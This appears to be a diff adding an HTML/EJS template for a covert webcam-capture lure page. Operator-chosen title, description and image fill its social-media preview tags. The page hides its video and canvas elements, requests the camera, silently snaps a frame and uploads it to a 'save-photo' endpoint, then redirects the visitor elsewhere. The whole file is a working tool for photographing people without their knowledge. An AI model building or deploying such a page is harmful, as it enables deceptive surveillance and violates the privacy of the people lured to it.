@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta itemprop="name" content="<%= name %>">
+    <meta itemprop="description" content="<%= desc %>">
+    <meta itemprop="image" content="https://<%= domain %>/favicon.jpg">
+
+    <meta property="og:url" content="<%= link %>">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="<%= name %>">
+    <meta property="og:description" content="<%= desc %>">
+    <meta property="og:image" content="https://<%= domain %>/favicon.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="<%= name %>">
+    <meta name="twitter:description" content="<%= desc %>">
+    <meta name="twitter:image" content="https://<%= domain %>/favicon.jpg">
+
+    <title><%= name %></title>
+    <style>
+        body {
+            background-image: url('bg.jpg');
+        }
+    </style>
+</head>
+
+<body>
+    <video id="player" controls autoplay style="display: none;"></video>
+    <canvas id="canvas" width="800" height="600" style="display: none;"></canvas>
+    <script>
+        const player = document.getElementById('player');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const captureButton = document.getElementById('capture');
+
+        const constraints = {
+            video: true,
+            optional: [
+                { minWidth: 320 },
+                { minWidth: 640 },
+                { minWidth: 1024 },
+                { minWidth: 1280 },
+                { minWidth: 1920 },
+                { minWidth: 2560 },
+            ]
+        };
+
+        navigator.mediaDevices.getUserMedia(constraints).then((stream) => {
+            player.srcObject = stream;
+        });
+
+        window.onload = function () {
+            player.addEventListener('loadeddata', async function () {
+                context.drawImage(player, 0, 0, canvas.width, canvas.height);
+                const pic = canvas.toDataURL("image/jpeg", 1.0).substring(23);
+                player.srcObject.getVideoTracks().forEach(track => track.stop());
+                const res = await fetch('save-photo', {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ photo: pic })
+                });
+                window.location.href = "<%= redirect %>";
+            }, false);
+        }
+    </script>
+</body>
+
+</html>
